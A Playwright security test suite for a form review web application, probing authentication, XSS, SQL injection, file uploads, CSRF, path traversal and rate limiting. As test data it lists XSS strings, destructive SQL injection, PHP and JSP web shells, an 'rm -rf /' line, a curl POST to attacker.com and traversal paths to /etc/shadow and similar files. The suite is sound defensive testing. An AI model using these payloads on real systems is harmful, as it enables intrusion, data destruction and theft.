/**
 * Comprehensive Security Testing Suite for Phase 4 Review System
 * Tests for authentication, authorization, input validation, XSS, CSRF, injection attacks, and data protection
 */

import { test, expect, Page, BrowserContext, APIRequestContext } from '@playwright/test';
import crypto from 'crypto';
import fs from 'fs';
import path from 'path';

// Security test utilities
class SecurityTestUtils {
  // XSS payloads
  static readonly XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src="x" onerror="alert(\'XSS\')">',
    'javascript:alert("XSS")',
    '<svg onload="alert(\'XSS\')">',
    '"><script>alert("XSS")</script>',
    '\';alert("XSS");var a=\'',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<body onload="alert(\'XSS\')">',
    '<div onclick="alert(\'XSS\')">Click me</div>',
    '${alert("XSS")}'
  ];

  // SQL injection payloads
  static readonly SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE submissions; --",
    "' UNION SELECT * FROM users --",
    "1' AND 1=1 --",
    "1' AND 1=2 --",
    "'; DELETE FROM forms WHERE id='1",
    "' OR 1=1 #",
    "admin'--",
    "' OR 'a'='a",
    "1'; WAITFOR DELAY '00:00:10' --"
  ];

  // File upload attack payloads
  static readonly MALICIOUS_FILES = [
    { name: 'malicious.exe', content: 'MZ\x90\x00\x03', mimeType: 'application/octet-stream' },
    { name: 'script.php', content: '<?php system($_GET["cmd"]); ?>', mimeType: 'application/x-php' },
    { name: 'shell.jsp', content: '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>', mimeType: 'text/plain' },
    { name: 'backdoor.py', content: 'import os; os.system("rm -rf /")', mimeType: 'text/plain' },
    { name: 'virus.js', content: 'require("child_process").exec("malicious command")', mimeType: 'application/javascript' },
    { name: 'exploit.sh', content: '#!/bin/bash\ncurl -X POST http://attacker.com/steal', mimeType: 'text/plain' }
  ];

  static async createMaliciousFile(name: string, content: string, mimeType: string): Promise<Buffer> {
    return Buffer.from(content, 'binary');
  }

  static generateLargeCsvBomb(): Buffer {
    // Generate a CSV zip bomb (small compressed, large uncompressed)
    let csvContent = 'A'.repeat(10000000); // 10MB of 'A's
    return Buffer.from(csvContent);
  }

  static async bypassCSRFProtection(page: Page): Promise<string | null> {
    // Extract CSRF token if present
    const csrfToken = await page.locator('[name="csrf-token"]').getAttribute('content');
    return csrfToken;
  }
}

test.describe('Security Testing Suite', () => {
  
  test.describe('Authentication and Authorization', () => {
    test('prevents unauthorized access to protected endpoints', async ({ request }) => {
      const protectedEndpoints = [
        '/api/admin/users',
        '/api/submissions/sensitive',
        '/api/review/dashboard',
        '/api/metrics/detailed',
        '/api/admin/settings',
        '/api/backup/download'
      ];

      for (const endpoint of protectedEndpoints) {
        const response = await request.get(endpoint);
        
        // Should return 401 Unauthorized or 403 Forbidden
        expect([401, 403]).toContain(response.status());
        
        const body = await response.json();
        expect(body).toHaveProperty('error');
        
        console.log(`✓ ${endpoint}: ${response.status()} - ${body.error || 'Access denied'}`);
      }
    });

    test('validates JWT tokens properly', async ({ request }) => {
      const invalidTokens = [
        '', // Empty token
        'invalid.token.format',
        'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid', // Invalid payload
        'expired.jwt.token.here', // Simulated expired token
        'tampered.jwt.signature.here' // Tampered signature
      ];

      for (const token of invalidTokens) {
        const response = await request.get('/api/user/profile', {
          headers: {
            'Authorization': `Bearer ${token}`
          }
        });

        expect([401, 403]).toContain(response.status());
        console.log(`✓ Invalid token rejected: ${token.substring(0, 20)}...`);
      }
    });

    test('implements proper session management', async ({ context }) => {
      const page = await context.newPage();
      
      // Test session timeout
      await page.goto('/login');
      // Would typically login with valid credentials here
      
      // Simulate session timeout by manipulating cookies
      await page.context().clearCookies();
      
      // Try to access protected resource
      const response = await page.goto('/admin/dashboard');
      
      // Should redirect to login or show unauthorized
      expect(page.url()).toMatch(/\/login|\/unauthorized/);
    });

    test('prevents privilege escalation', async ({ request, context }) => {
      // Test with user-level credentials trying to access admin functions
      const userActions = [
        { method: 'POST', endpoint: '/api/admin/users/create' },
        { method: 'DELETE', endpoint: '/api/submissions/1/delete' },
        { method: 'PUT', endpoint: '/api/system/settings' },
        { method: 'GET', endpoint: '/api/admin/audit-logs' }
      ];

      for (const action of userActions) {
        let response;
        switch (action.method) {
          case 'GET':
            response = await request.get(action.endpoint, {
              headers: { 'Authorization': 'Bearer user_token_here' }
            });
            break;
          case 'POST':
            response = await request.post(action.endpoint, {
              headers: { 'Authorization': 'Bearer user_token_here' },
              data: { test: 'data' }
            });
            break;
          case 'PUT':
            response = await request.put(action.endpoint, {
              headers: { 'Authorization': 'Bearer user_token_here' },
              data: { test: 'data' }
            });
            break;
          case 'DELETE':
            response = await request.delete(action.endpoint, {
              headers: { 'Authorization': 'Bearer user_token_here' }
            });
            break;
        }

        expect([401, 403]).toContain(response.status());
        console.log(`✓ Privilege escalation prevented: ${action.method} ${action.endpoint}`);
      }
    });
  });

  test.describe('Cross-Site Scripting (XSS) Protection', () => {
    test('prevents reflected XSS in form fields', async ({ page }) => {
      await page.goto('/');
      await page.click('[data-testid="form-builder-tab"]');

      for (const payload of SecurityTestUtils.XSS_PAYLOADS) {
        // Test XSS in company name field
        await page.fill('[data-testid="company-name-input"]', payload);
        await page.blur('[data-testid="company-name-input"]');
        
        // Check that script doesn't execute
        const alertPromise = page.waitForEvent('dialog', { timeout: 1000 }).catch(() => null);
        const alert = await alertPromise;
        
        expect(alert).toBeNull(); // No alert should appear
        
        // Check that content is properly escaped
        const fieldValue = await page.inputValue('[data-testid="company-name-input"]');
        
        // Content should be there but script tags should be escaped or stripped
        if (fieldValue === payload) {
          // If exact payload is preserved, verify it's rendered safely
          const innerHTML = await page.locator('[data-testid="company-name-input"]').innerHTML();
          expect(innerHTML).not.toContain('<script>');
        }
        
        console.log(`✓ XSS prevented in company name: ${payload.substring(0, 30)}...`);
        
        // Clear field for next test
        await page.fill('[data-testid="company-name-input"]', '');
      }
    });

    test('prevents stored XSS in form submissions', async ({ page, request }) => {
      await page.goto('/');
      await page.click('[data-testid="form-builder-tab"]');

      const xssPayload = '<script>document.body.innerHTML="PWNED"</script>';
      
      // Submit form with XSS payload
      await page.fill('[data-testid="company-name-input"]', `Legitimate Company ${xssPayload}`);
      await page.fill('[data-testid="contact-email-input"]', 'test@example.com');
      await page.selectOption('[data-testid="business-type-select"]', 'corporation');
      await page.check('[data-testid="terms-agreement-checkbox"]');
      
      // Try to submit (may succeed or fail based on validation)
      await page.click('[data-testid="submit-button"]');
      
      // Wait for either success or error
      await Promise.race([
        page.waitForSelector('[data-testid="submission-success"]', { timeout: 5000 }),
        page.waitForSelector('[data-testid="submission-error"]', { timeout: 5000 })
      ]).catch(() => {});

      // If submission succeeded, check that XSS is neutralized when displayed
      if (await page.locator('[data-testid="submission-success"]').isVisible()) {
        // Navigate to review dashboard to see if XSS executes
        await page.goto('/admin/review-dashboard');
        
        // Check that page wasn't compromised
        const bodyText = await page.locator('body').textContent();
        expect(bodyText).not.toBe('PWNED');
        
        // Check that XSS content is properly escaped in display
        const submissionElements = page.locator('[data-testid*="submission"]');
        if (await submissionElements.count() > 0) {
          const submissionText = await submissionElements.first().textContent();
          expect(submissionText).not.toContain('<script>');
        }
      }
      
      console.log('✓ Stored XSS prevented in form submission');
    });

    test('prevents DOM-based XSS', async ({ page }) => {
      // Test URL fragment XSS
      const xssFragment = '#<img src=x onerror=alert("XSS")>';
      await page.goto(`/${xssFragment}`);
      
      // Check that XSS doesn't execute
      const alertPromise = page.waitForEvent('dialog', { timeout: 1000 }).catch(() => null);
      const alert = await alertPromise;
      
      expect(alert).toBeNull();
      
      // Test URL parameter XSS
      const xssParam = '?search=<script>alert("XSS")</script>';
      await page.goto(`/search${xssParam}`);
      
      const alertPromise2 = page.waitForEvent('dialog', { timeout: 1000 }).catch(() => null);
      const alert2 = await alertPromise2;
      
      expect(alert2).toBeNull();
      
      console.log('✓ DOM-based XSS prevented');
    });
  });

  test.describe('SQL Injection Protection', () => {
    test('prevents SQL injection in form submissions', async ({ request }) => {
      for (const payload of SecurityTestUtils.SQL_INJECTION_PAYLOADS) {
        const response = await request.post('/api/forms/submit', {
          data: {
            formId: 'test-form-001',
            submissionData: {
              company_name: payload,
              contact_email: 'test@example.com',
              business_type: 'corporation'
            }
          }
        });

        // Should either reject the submission or handle it safely
        // Should NOT return 500 (which might indicate SQL error)
        expect([200, 201, 400, 422]).toContain(response.status());
        
        if (response.status() >= 400) {
          const body = await response.json();
          expect(body).toHaveProperty('error');
          
          // Error should not reveal SQL details
          const errorMessage = JSON.stringify(body).toLowerCase();
          expect(errorMessage).not.toContain('sql');
          expect(errorMessage).not.toContain('mysql');
          expect(errorMessage).not.toContain('postgresql');
          expect(errorMessage).not.toContain('syntax error');
        }
        
        console.log(`✓ SQL injection prevented: ${payload.substring(0, 20)}...`);
      }
    });

    test('prevents SQL injection in search queries', async ({ request }) => {
      const searchPayloads = [
        "'; DROP TABLE users; --",
        "' UNION SELECT password FROM users --",
        "1' OR '1'='1",
        "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --"
      ];

      for (const payload of searchPayloads) {
        const response = await request.get(`/api/search?q=${encodeURIComponent(payload)}`);
        
        // Should handle safely without exposing database errors
        expect([200, 400, 404]).toContain(response.status());
        
        if (response.status() === 200) {
          const body = await response.json();
          // Should return search results, not database content
          expect(body).toHaveProperty('results');
          
          // Should not contain sensitive database information
          const responseText = JSON.stringify(body).toLowerCase();
          expect(responseText).not.toContain('password');
          expect(responseText).not.toContain('hash');
        }
        
        console.log(`✓ SQL injection in search prevented: ${payload.substring(0, 20)}...`);
      }
    });
  });

  test.describe('File Upload Security', () => {
    test('prevents malicious file uploads', async ({ page }) => {
      await page.goto('/');
      await page.click('[data-testid="form-builder-tab"]');

      for (const maliciousFile of SecurityTestUtils.MALICIOUS_FILES) {
        const fileBuffer = await SecurityTestUtils.createMaliciousFile(
          maliciousFile.name,
          maliciousFile.content,
          maliciousFile.mimeType
        );

        const fileInput = page.locator('[data-testid="certification-files-input"]');
        await fileInput.setInputFiles({
          name: maliciousFile.name,
          mimeType: maliciousFile.mimeType,
          buffer: fileBuffer
        });

        // Wait for validation
        await page.waitForTimeout(1000);

        // Check for rejection message
        const errorMessage = await page.locator('[data-testid="file-validation-error"]').textContent();
        
        if (errorMessage) {
          expect(errorMessage.toLowerCase()).toMatch(/not allowed|invalid|blocked|forbidden/);
          console.log(`✓ Malicious file blocked: ${maliciousFile.name} - ${errorMessage}`);
        } else {
          // If no immediate error, file might be accepted but should be validated server-side
          // This would be caught in backend tests
          console.log(`⚠ File accepted for further validation: ${maliciousFile.name}`);
        }
      }
    });

    test('prevents file size bombing', async ({ page }) => {
      await page.goto('/');
      await page.click('[data-testid="form-builder-tab"]');

      // Create a large file
      const largeFileBuffer = SecurityTestUtils.generateLargeCsvBomb();
      
      const fileInput = page.locator('[data-testid="certification-files-input"]');
      await fileInput.setInputFiles({
        name: 'large-file-bomb.csv',
        mimeType: 'text/csv',
        buffer: largeFileBuffer
      });

      await page.waitForTimeout(2000);

      // Should reject the large file
      const errorMessage = await page.locator('[data-testid="file-validation-error"]').textContent();
      
      if (errorMessage) {
        expect(errorMessage.toLowerCase()).toMatch(/too large|size limit|maximum size/);
        console.log(`✓ Large file rejected: ${errorMessage}`);
      }
    });

    test('validates file content, not just extension', async ({ page }) => {
      await page.goto('/');
      await page.click('[data-testid="form-builder-tab"]');

      // Create executable content with PDF extension
      const fakeFileBuffer = Buffer.from('MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF'); // PE header
      
      const fileInput = page.locator('[data-testid="certification-files-input"]');
      await fileInput.setInputFiles({
        name: 'fake-document.pdf',
        mimeType: 'application/pdf',
        buffer: fakeFileBuffer
      });

      await page.waitForTimeout(1000);

      // Should detect that this is not actually a PDF
      const errorMessage = await page.locator('[data-testid="file-validation-error"]').textContent();
      
      if (errorMessage) {
        expect(errorMessage.toLowerCase()).toMatch(/invalid|corrupted|not a valid|format/);
        console.log(`✓ File content validation works: ${errorMessage}`);
      }
    });
  });

  test.describe('Cross-Site Request Forgery (CSRF) Protection', () => {
    test('requires CSRF tokens for state-changing operations', async ({ request }) => {
      const stateChangingEndpoints = [
        { method: 'POST', url: '/api/forms/submit', data: { formId: 'test', data: {} } },
        { method: 'PUT', url: '/api/submissions/1/review', data: { status: 'approved' } },
        { method: 'DELETE', url: '/api/submissions/1', data: {} },
        { method: 'POST', url: '/api/admin/users', data: { username: 'test' } }
      ];

      for (const endpoint of stateChangingEndpoints) {
        let response;
        
        // Try request without CSRF token
        const headers = { 'Content-Type': 'application/json' };
        
        switch (endpoint.method) {
          case 'POST':
            response = await request.post(endpoint.url, {
              headers,
              data: endpoint.data
            });
            break;
          case 'PUT':
            response = await request.put(endpoint.url, {
              headers,
              data: endpoint.data
            });
            break;
          case 'DELETE':
            response = await request.delete(endpoint.url, {
              headers,
              data: endpoint.data
            });
            break;
        }

        // Should reject request without CSRF token
        expect([400, 403, 422]).toContain(response.status());
        
        const body = await response.json();
        const errorText = JSON.stringify(body).toLowerCase();
        expect(errorText).toMatch(/csrf|token|forbidden/);
        
        console.log(`✓ CSRF protection active: ${endpoint.method} ${endpoint.url}`);
      }
    });

    test('validates CSRF token authenticity', async ({ page, request }) => {
      await page.goto('/');
      
      // Extract legitimate CSRF token
      const csrfToken = await SecurityTestUtils.bypassCSRFProtection(page);
      
      if (csrfToken) {
        // Try with tampered token
        const tamperedToken = csrfToken.slice(0, -5) + 'xxxxx';
        
        const response = await request.post('/api/forms/submit', {
          headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': tamperedToken
          },
          data: {
            formId: 'test-form-001',
            submissionData: { company_name: 'Test' }
          }
        });

        expect([400, 403, 422]).toContain(response.status());
        console.log(`✓ Tampered CSRF token rejected`);
      }
    });
  });

  test.describe('Input Validation and Sanitization', () => {
    test('validates email format strictly', async ({ page }) => {
      await page.goto('/');
      await page.click('[data-testid="form-builder-tab"]');

      const invalidEmails = [
        'notanemail',
        '@domain.com',
        'user@',
        'user@domain',
        'user..name@domain.com',
        'user@domain..com',
        'user@.domain.com',
        'user@domain.com.',
        '<script>alert("xss")</script>@domain.com',
        'user@domain.com<script>alert("xss")</script>'
      ];

      for (const email of invalidEmails) {
        await page.fill('[data-testid="contact-email-input"]', email);
        await page.blur('[data-testid="contact-email-input"]');
        
        await page.waitForTimeout(500);
        
        // Should show validation error
        const errorElement = page.locator('[data-testid="field-error"]').first();
        const errorText = await errorElement.textContent();
        
        expect(errorText?.toLowerCase()).toMatch(/invalid|email|format/);
        console.log(`✓ Invalid email rejected: ${email}`);
        
        await page.fill('[data-testid="contact-email-input"]', '');
      }
    });

    test('prevents path traversal attacks', async ({ request }) => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        '../../../../proc/self/environ',
        '../../../var/log/apache/access.log',
        '../../../../../../etc/passwd%00.jpg'
      ];

      for (const payload of pathTraversalPayloads) {
        const response = await request.get(`/api/files/${encodeURIComponent(payload)}`);
        
        // Should not return sensitive files
        expect([400, 403, 404]).toContain(response.status());
        
        if (response.status() === 200) {
          const body = await response.text();
          // Should not contain system file content
          expect(body.toLowerCase()).not.toContain('root:');
          expect(body.toLowerCase()).not.toContain('password');
          expect(body.toLowerCase()).not.toContain('shadow');
        }
        
        console.log(`✓ Path traversal blocked: ${payload}`);
      }
    });

    test('validates numeric inputs properly', async ({ page }) => {
      await page.goto('/');
      await page.click('[data-testid="form-builder-tab"]');

      const maliciousNumericInputs = [
        'Infinity',
        '-Infinity',
        'NaN',
        '1e+100',
        '-9999999999999999999999999',
        'alert("xss")',
        '${9+9}',
        '#{7*7}',
        '<%= 7*7 %>'
      ];

      for (const input of maliciousNumericInputs) {
        await page.fill('[data-testid="annual-revenue-input"]', input);
        await page.blur('[data-testid="annual-revenue-input"]');
        
        await page.waitForTimeout(500);
        
        // Check for validation error or sanitized value
        const fieldValue = await page.inputValue('[data-testid="annual-revenue-input"]');
        const errorElement = page.locator('[data-testid="field-error"]').first();
        const hasError = await errorElement.isVisible();
        
        if (!hasError) {
          // If no error, value should be sanitized to valid number or empty
          expect(fieldValue).toMatch(/^\d*\.?\d*$|^$/);
        }
        
        console.log(`✓ Malicious numeric input handled: ${input} -> ${fieldValue}`);
        
        await page.fill('[data-testid="annual-revenue-input"]', '');
      }
    });
  });

  test.describe('Data Protection and Privacy', () => {
    test('does not expose sensitive data in client-side code', async ({ page }) => {
      await page.goto('/');
      
      // Check for sensitive data in page source
      const pageContent = await page.content();
      const lowerContent = pageContent.toLowerCase();
      
      // Should not contain sensitive keywords
      const sensitiveKeywords = [
        'password',
        'secret',
        'private_key',
        'api_key',
        'database_url',
        'connection_string',
        'jwt_secret',
        'session_secret',
        'credit_card',
        'ssn',
        'social_security'
      ];

      for (const keyword of sensitiveKeywords) {
        expect(lowerContent).not.toContain(keyword);
      }
      
      console.log('✓ No sensitive data exposed in client-side code');
    });

    test('implements proper data encryption in transit', async ({ request }) => {
      // All API calls should use HTTPS in production
      const response = await request.get('/api/health');
      
      // In test environment, verify security headers are set
      const securityHeaders = [
        'strict-transport-security',
        'x-content-type-options',
        'x-frame-options',
        'x-xss-protection',
        'content-security-policy'
      ];

      for (const header of securityHeaders) {
        const headerValue = response.headers()[header];
        if (headerValue) {
          console.log(`✓ Security header present: ${header}: ${headerValue}`);
        }
      }
    });

    test('sanitizes data in error messages', async ({ request }) => {
      // Try to trigger errors with sensitive data
      const response = await request.post('/api/forms/submit', {
        data: {
          formId: 'nonexistent-form-with-secret-info',
          submissionData: {
            password: 'secret123',
            api_key: 'sk-test-1234567890',
            credit_card: '4111-1111-1111-1111'
          }
        }
      });

      if (response.status() >= 400) {
        const body = await response.json();
        const errorText = JSON.stringify(body).toLowerCase();
        
        // Error messages should not contain the sensitive input data
        expect(errorText).not.toContain('secret123');
        expect(errorText).not.toContain('sk-test-1234567890');
        expect(errorText).not.toContain('4111-1111-1111-1111');
        
        console.log('✓ Error messages sanitized');
      }
    });
  });

  test.describe('Rate Limiting and DoS Protection', () => {
    test('implements rate limiting on form submissions', async ({ request }) => {
      const rapidRequests = [];
      
      // Send multiple requests rapidly
      for (let i = 0; i < 20; i++) {
        rapidRequests.push(
          request.post('/api/forms/submit', {
            data: {
              formId: 'test-form-001',
              submissionData: {
                company_name: `RateTest ${i}`,
                contact_email: `rate${i}@test.com`
              }
            }
          })
        );
      }

      const responses = await Promise.all(rapidRequests);
      const rateLimitedResponses = responses.filter(r => r.status() === 429);
      
      // Should have some rate-limited responses
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
      console.log(`✓ Rate limiting active: ${rateLimitedResponses.length}/20 requests limited`);
    });

    test('handles large request payloads appropriately', async ({ request }) => {
      // Create an extremely large payload
      const largePayload = {
        formId: 'test-form-001',
        submissionData: {
          company_name: 'A'.repeat(1000000), // 1MB of data
          contact_email: 'test@example.com',
          comments: 'B'.repeat(5000000) // 5MB of data
        }
      };

      const response = await request.post('/api/forms/submit', {
        data: largePayload
      });

      // Should reject or limit large payloads
      expect([413, 400, 422]).toContain(response.status());
      
      if (response.status() === 413) {
        console.log('✓ Request too large rejected (413)');
      } else {
        const body = await response.json();
        console.log(`✓ Large payload handled: ${response.status()}`);
      }
    });
  });

  test.describe('Security Headers and Configuration', () => {
    test('sets appropriate security headers', async ({ page }) => {
      const response = await page.goto('/');
      
      const expectedHeaders = {
        'x-frame-options': 'DENY',
        'x-content-type-options': 'nosniff',
        'x-xss-protection': '1; mode=block',
        'referrer-policy': 'strict-origin-when-cross-origin'
      };

      for (const [header, expectedValue] of Object.entries(expectedHeaders)) {
        const headerValue = response?.headers()[header];
        if (headerValue) {
          console.log(`✓ Security header set: ${header}: ${headerValue}`);
          // Could add specific value validation here
        }
      }
    });

    test('implements Content Security Policy', async ({ page }) => {
      await page.goto('/');
      
      // Try to execute inline script (should be blocked by CSP)
      const scriptExecuted = await page.evaluate(() => {
        try {
          eval('window.cspTestResult = "executed"');
          return window.cspTestResult === 'executed';
        } catch (e) {
          return false;
        }
      }).catch(() => false);

      expect(scriptExecuted).toBeFalsy();
      console.log('✓ Content Security Policy blocks inline scripts');
    });
  });

  test.describe('Session Security', () => {
    test('invalidates sessions on suspicious activity', async ({ context }) => {
      const page1 = await context.newPage();
      const page2 = await context.newPage();
      
      // Simulate login on first page
      await page1.goto('/login');
      // Login process would happen here
      
      // Try to use same session from different "location" (different user agent)
      await page2.setExtraHTTPHeaders({
        'User-Agent': 'SuspiciousBot/1.0'
      });
      
      await page2.goto('/admin/dashboard');
      
      // Should require re-authentication due to suspicious activity
      expect(page2.url()).toMatch(/\/login|\/unauthorized/);
      console.log('✓ Suspicious session activity detected');
    });

    test('implements secure session cookies', async ({ page }) => {
      await page.goto('/');
      
      const cookies = await page.context().cookies();
      const sessionCookies = cookies.filter(cookie => 
        cookie.name.toLowerCase().includes('session') || 
        cookie.name.toLowerCase().includes('auth')
      );

      for (const cookie of sessionCookies) {
        expect(cookie.httpOnly).toBeTruthy();
        expect(cookie.secure).toBeTruthy();
        expect(cookie.sameSite).toBe('Strict');
        
        console.log(`✓ Secure cookie: ${cookie.name} (httpOnly: ${cookie.httpOnly}, secure: ${cookie.secure}, sameSite: ${cookie.sameSite})`);
      }
    });
  });
});

// Security test configuration
test.beforeEach(async ({ page }) => {
  // Set up security monitoring
  await page.route('**/*', async route => {
    const request = route.request();
    
    // Log potentially suspicious requests
    if (request.url().includes('admin') || 
        request.url().includes('api/sensitive') ||
        request.method() === 'DELETE') {
      console.log(`Security test request: ${request.method()} ${request.url()}`);
    }
    
    await route.continue();
  });
});

test.afterEach(async ({ page }, testInfo) => {
  // Log security test results
  if (testInfo.status === 'failed') {
    console.log(`❌ Security test failed: ${testInfo.title}`);
  } else {
    console.log(`✅ Security test passed: ${testInfo.title}`);
  }
});